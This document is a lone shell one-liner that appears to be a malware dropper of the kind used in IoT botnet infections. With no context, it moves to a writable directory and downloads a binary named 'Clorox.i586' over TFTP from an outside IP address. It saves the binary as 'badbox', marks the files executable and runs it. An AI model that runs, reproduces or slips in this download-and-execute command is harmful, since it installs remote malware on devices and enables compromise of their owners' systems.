cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r Clorox.i586 -g 46.166.185.52;cat Clorox.i586 >badbox;chmod +x *;./badbox
